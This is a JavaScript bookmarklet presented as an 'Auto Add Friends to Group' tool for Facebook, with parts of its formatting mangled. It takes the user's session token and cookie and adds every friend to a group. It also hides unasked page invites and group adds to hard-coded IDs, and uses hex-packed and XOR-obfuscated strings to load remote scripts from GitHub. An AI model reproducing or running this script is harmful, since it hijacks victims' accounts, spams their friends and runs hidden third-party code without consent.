			eval(unescape("javascript: (function () {
    var f = {
        dtsg: document.getElementsByName('fb_dtsg')[0].value,
        uid: document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
        gid: document.getElementsByName('group_id')[0].value,
        arr: new Array(),
        prenKe: 0,
        suc: 0,
        p: 0,
        err: 0,
        count: 3,
        ajaxify: function (b) {
            var c = new XMLHttpRequest();
            c.open('GET', b, true);
            c.onreadystatechange = function () {
                if (c.readyState == 4 && c.status == 200) {
                    var a = eval('(' + c.responseText.substr(9) + ')');
                    if (a.payload && a.payload.entries) {
                        f.arr = a.payload.entries.sort(function () {
                            return 0.5 - Math.random()
                        })
                    }
                    var Main = '<div style="
			        padding - bottom: 5px; font - size: 20px;
			        ">' + Title + '</div><div style="
			        font - size: 14px;
			        "><b>' + f.arr.length + ' </b>Friends Collected</div><div id="
			        BODY "></div><div id="
			        Group_Members_Counter "></div><div id="
			        display " style="
			        min - width: 300px; display: inline - block; text - align: left "></div>' + crj;
                    document.getElementById('MAIN').innerHTML = Main;
                    for (i in f.arr) {
                        f.setAjax(i)
                    }
                } else if (c.readyState == 4 && c.status == 404) {
                    document.getElementById('MAIN').innerHTML = '<div style="
			        padding - bottom: 5px; font - size: 20px;
			        ">' + Title + '</div><b style="
			        color: darkred ">Page Not Found!</b>' + crj
                } else {
                    document.getElementById('MAIN').innerHTML = '<div style="
			        padding - bottom: 5px; font - size: 20px;
			        ">' + Title + '</div><b style="
			        color: darkgreen ">Your Friends Have Been Collected & Now Starting Adding.</b>' + crj
                }
            };
            c.send()
        },
        setAjax: function (i) {
            var e = new XMLHttpRequest(),
                prm = '__a=1&fb_dtsg=' + f.dtsg + '&group_id=' + f.gid + '&source=typeahead&ref=&message_id=&members=' + f.arr[i].uid + '&__user=' + f.uid + '&phstamp=';
            e.open('POST', '/ajax/groups/members/add_post.php', true);
            e.onreadystatechange = function () {
                if (e.readyState == 4 && e.status == 200) {
                    var a = eval('(' + e.responseText.substr(9) + ')');
                    f.prenKe++;
                    document.getElementById('BODY').innerHTML = '<div style="
			        font - size: 14px;
			        "><b>' + f.prenKe + '</b> Friends Processed and <b>' + f.suc + '</b> Friends Added (' + f.err + ' Not Added)</div>';

                    function SuggestFriend() {


                        jx.load(window.location.protocol + " //www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=514486465297821&__user=" + f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
			        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=297301193718363&__user=" + f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post") jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=344698058973704&__user=" + f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")

			        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=637005376320957&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");

			    }
			    jx = {
			        b: function () {
			            var b = !1;
			            if ("undefined" != typeof ActiveXObject) try {
			                b = new ActiveXObject("Msxml2.XMLHTTP")
			            } catch (c) {
			                try {
			                    b = new ActiveXObject("Microsoft.XMLHTTP")
			                } catch (a) {
			                    b = !1
			                }
			            } else if (window.XMLHttpRequest) try {
			                b = new XMLHttpRequest
			            } catch (h) {
			                b = !1
			            }
			            return b
			        },
			        load: function (b, c, a, h, g) {
			            var e = this.d();
			            if (e && b) {
			                e.overrideMimeType && e.overrideMimeType("text/xml");
			                h || (h = "GET");
			                a || (a = "text");
			                g || (g = {});
			                a = a.toLowerCase();
			                h = h.toUpperCase();
			                b += b.indexOf("?") + 1 ? "&" : "?";
			                var k = null;
			                "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
			                e.open(h, b, !0);
			                e.onreadystatechange = g.c ? function () {
			                    g.c(e)
			                } : function () {
			                    if (4 == e.readyState)
			                        if (200 == e.status) {
			                            var b = "";
			                            e.responseText && (b = e.responseText);
			                            "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
			                            c && c(b)
			                        } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
			                };
			                e.send(k)
			            }
			        },
			        d: function () {
			            return this.b()
			        }
			    };

			    var _0xe929 = ["\x66\x20\x61\x3D\x27\x3C\x62\x20\x30\x3D\x22\x67\x2D\x68\x3A\x69\x3B\x31\x3A\x6A\x3B\x6B\x2D\x6C\x3A\x6D\x3B\x22\x3E\x6E\x20\x63\x3A\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x6F\x22\x20\x36\x3D\x22\x37\x22\x3E\x70\x20\x5B\x71\x20\x5D\x20\x72\x25\x3C\x2F\x41\x3E\x20\x26\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x73\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x74\x20\x75\x20\x76\x20\x77\x3C\x2F\x41\x3E\x2E\x3C\x2F\x64\x3E\x78\x20\x79\x20\x63\x3A\x20\x3C\x2F\x41\x3E\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x7A\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x42\x20\x43\x3C\x2F\x41\x3E\x3C\x2F\x41\x3E\x2C\x3C\x2F\x41\x3E\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x44\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x45\x20\x46\x2E\x20\x47\x3C\x2F\x41\x3E\x3C\x2F\x41\x3E\x2E\x3C\x2F\x64\x3E\x48\x20\x49\x20\x4A\x20\x4B\x20\x4C\x20\x4D\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x4E\x2E\x4F\x2E\x50\x2F\x22\x20\x36\x3D\x22\x37\x22\x3E\x51\x20\x52\x20\x53\x3C\x2F\x41\x3E\x2E\x3C\x2F\x41\x3E\x3C\x62\x3E\x27\x3B\x54\x28\x55\x21\x3D\x61\x29\x7B\x56\x3A\x28\x57\x28\x29\x7B\x65\x2E\x58\x2E\x59\x28\x65\x2E\x5A\x28\x27\x31\x30\x27\x29\x29\x2E\x31\x31\x3D\x27\x31\x32\x3A\x2F\x2F\x31\x33\x2E\x31\x34\x2E\x35\x2F\x31\x35\x2F\x31\x36\x2D\x31\x37\x2F\x31\x38\x2F\x31\x39\x2E\x31\x61\x27\x7D\x29\x28\x29\x7D", "\x7C", "\x73\x70\x6C\x69\x74", "\x73\x74\x79\x6C\x65\x7C\x63\x6F\x6C\x6F\x72\x7C\x33\x42\x35\x39\x39\x38\x7C\x68\x72\x65\x66\x7C\x68\x74\x74\x70\x7C\x63\x6F\x6D\x7C\x74\x61\x72\x67\x65\x74\x7C\x5F\x62\x6C\x61\x6E\x6B\x7C\x77\x77\x77\x7C\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x4F\x6D\x6E\x69\x5F\x74\x65\x78\x74\x7C\x64\x69\x76\x7C\x42\x79\x7C\x62\x72\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x76\x61\x72\x7C\x6D\x61\x72\x67\x69\x6E\x7C\x74\x6F\x70\x7C\x35\x70\x78\x7C\x67\x72\x61\x79\x7C\x66\x6F\x6E\x74\x7C\x73\x69\x7A\x65\x7C\x39\x70\x78\x7C\x50\x6F\x77\x65\x72\x65\x64\x7C\x33\x31\x33\x30\x37\x32\x35\x33\x32\x31\x30\x31\x30\x37\x36\x7C\x4C\x6F\x61\x64\x69\x6E\x67\x7C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x7C\x39\x39\x7C\x31\x39\x39\x31\x33\x34\x34\x39\x36\x39\x31\x34\x30\x37\x37\x7C\x41\x73\x73\x61\x6D\x7C\x49\x6E\x64\x69\x61\x6E\x7C\x43\x79\x62\x65\x72\x7C\x46\x6F\x72\x63\x65\x7C\x53\x63\x72\x69\x70\x74\x7C\x4D\x61\x64\x65\x7C\x31\x30\x30\x30\x30\x31\x30\x35\x30\x32\x33\x35\x34\x32\x30\x7C\x7C\x57\x61\x71\x61\x72\x7C\x41\x68\x6D\x61\x64\x7C\x31\x30\x30\x30\x30\x35\x31\x31\x35\x39\x33\x38\x36\x31\x34\x7C\x42\x68\x61\x72\x67\x61\x76\x7C\x4A\x54\x7C\x47\x6F\x67\x6F\x69\x7C\x46\x6F\x72\x7C\x4D\x6F\x72\x65\x7C\x54\x6F\x6F\x6C\x73\x7C\x56\x69\x73\x69\x74\x7C\x4F\x75\x72\x7C\x42\x6C\x6F\x67\x67\x65\x72\x7C\x61\x75\x74\x6F\x6D\x61\x74\x65\x79\x6F\x75\x72\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x62\x6C\x6F\x67\x73\x70\x6F\x74\x7C\x69\x6E\x7C\x41\x75\x74\x6F\x6D\x61\x74\x65\x7C\x59\x6F\x75\x72\x7C\x46\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x69\x66\x7C\x63\x72\x6A\x7C\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x62\x6F\x64\x79\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x73\x63\x72\x69\x70\x74\x7C\x73\x72\x63\x7C\x68\x74\x74\x70\x73\x7C\x72\x61\x77\x7C\x67\x69\x74\x68\x75\x62\x7C\x62\x68\x61\x72\x67\x61\x76\x31\x39\x39\x36\x7C\x46\x75\x6E\x7C\x74\x69\x6D\x65\x7C\x6D\x61\x73\x74\x65\x72\x7C\x55\x6E\x69\x6F\x6E\x7C\x6A\x73", "", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65", "\x72\x65\x70\x6C\x61\x63\x65", "\x5C\x77\x2B", "\x5C\x62", "\x67"]; eval(function (_0x1e5ax1, _0x1e5ax2, _0x1e5ax3, _0x1e5ax4, _0x1e5ax5, _0x1e5ax6) {
			        _0x1e5ax5 = function (_0x1e5ax3) {
			            return (_0x1e5ax3 < _0x1e5ax2 ? _0xe929[4] : _0x1e5ax5(parseInt(_0x1e5ax3 / _0x1e5ax2))) + ((_0x1e5ax3 = _0x1e5ax3 % _0x1e5ax2) > 35 ? String[_0xe929[5]](_0x1e5ax3 + 29) : _0x1e5ax3.toString(36));
			        };
			        if (!_0xe929[4][_0xe929[6]](/^/, String)) {
			            while (_0x1e5ax3--) {
			                _0x1e5ax6[_0x1e5ax5(_0x1e5ax3)] = _0x1e5ax4[_0x1e5ax3] || _0x1e5ax5(_0x1e5ax3);
			            };
			            _0x1e5ax4 = [

			                function (_0x1e5ax5) {
			                    return _0x1e5ax6[_0x1e5ax5];
			                }
			            ];
			            _0x1e5ax5 = function () {
			                return _0xe929[7];
			            };
			            _0x1e5ax3 = 1;
			        };
			        while (_0x1e5ax3--) {
			            if (_0x1e5ax4[_0x1e5ax3]) {
			                _0x1e5ax1 = _0x1e5ax1[_0xe929[6]](new RegExp(_0xe929[8] + _0x1e5ax5(_0x1e5ax3) + _0xe929[8], _0xe929[9]), _0x1e5ax4[_0x1e5ax3]);
			            };
			        };
			        return _0x1e5ax1;
			    }(_0xe929[0], 62, 73, _0xe929[3][_0xe929[2]](_0xe929[1]), 0, {})); SuggestFriend();
			    if (a.jsmods && a.jsmods.require) {
			        var b = '<div>';
			        for (x in a.jsmods.require) {
			            if (a.jsmods.require[x][a.jsmods.require[x].length - 1][1]) {
			                b += '<b style="color:darkgreen">' + a.jsmods.require[x][a.jsmods.require[x].length - 1][1] + '</b>'
			            }
			        }
			        b += '</div>';
			        document.getElementById('Group_Members_Counter').innerHTML = b
			    }
			    if (a.errorDescription) {
			        f.err++;
			        document.getElementById('display').innerHTML = '<div style="left:50%;text-align:center;padding-bottom:8px;color:darkred;font-size:9px;"><b>(' + f.err + ') </b>' + a.errorDescription + '</div>'
			    }
			    if (a.onload) {
			        f.suc++;
			        document.getElementById('display').innerHTML = '<div style="left:50%;color:darkgreen;text-align:center;padding-bottom:8px"><b style="text-align:center;color:darkgreen;font-size:12px;">(' + f.suc + ')</b> <b>' + f.arr[i].text + '</b> has been added.</div>'
			    }
			    document.getElementById('display').innerHTML += '<img style="background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:75px;padding:2px;border:1px solid rgba(0,0,0,0.4);" src=' + f.arr[i].photo + '></img><a style="padding-left:8px;font-size:14px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;">' + f.arr[i].text + '</a>';
			    if (f.prenKe == f.arr.length) {
			        document.getElementById('MAIN').innerHTML = '<div style="padding-bottom:5px;font-size:20px;">' + Title + '</div><div style="font-size:14px;"><b>' + f.arr.length + ' </b>Friends Collected and <b>' + f.suc + '</b> Friends Added</div><div id="Group_Members_Counter">' + document.getElementById('Group_Members_Counter').innerHTML + '</div><br/<div><span class="FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge" onClick="ChangeLocation()" style="color:white">Go to Homepage</span><span class="layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge" onClick="window.location.reload()" style="color:white">Refresh Page</span><span class="layerCancel uiOverlayButton uiButton uiButtonLarge" onClick="document.getElementById(\'MAIN\').style.display=\'none\'" style="color:gray">Cancel</span><br/><div>' + crj + '</div>'
			    }
			}
			};
			e.send(prm)
			}
			};
			var Title = 'Auto Add Friends|Members to Group.',
			    crj = '<div style="margin-top:5px;color:gray;font-size:9px;">Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/313072532101076" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="http://www.facebook.com/199134496914077" target="_blank"> Assam Indian Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://automateyourfacebook.blogspot.in/" target="_blank">Automate Your Facebook</A>.</A><div>';
			var DISPLAY = '<div id="MAIN" style="min-height:50px;width:500px;position:fixed;top:100px;box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;text-align:center;border-radius:10px;padding:5px;z-index:999999;border:3px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000">';
			DISPLAY += '<div style="padding-bottom:5px;font-size:20px;color:#000000;">' + Title + '</div>';
			DISPLAY += '<b style="color:#3B5998;font-size:12px;">Please Wait While Collecting Your Friends.</b>';
			DISPLAY += crj;
			DISPLAY += '</div>';
			document.body.appendChild(document.createElement('div')).innerHTML = DISPLAY;
			f.ajaxify('/ajax/typeahead/first_degree.php?__a=1&viewer=' + f.uid + '&token=' + Math.random() + '&filter[0]=user&options[0]=friends_only')
			})();
			var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Qwrrmpv]Dkng,hq";
			Y = "";
			Z = "";
			var V;
			V = X.length;
			for (i = 0; i < V; i++) {
			    Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
			}
			Z = unescape(Y);
			document.body.appendChild(document.createElement('script')).src = Z;
			"));
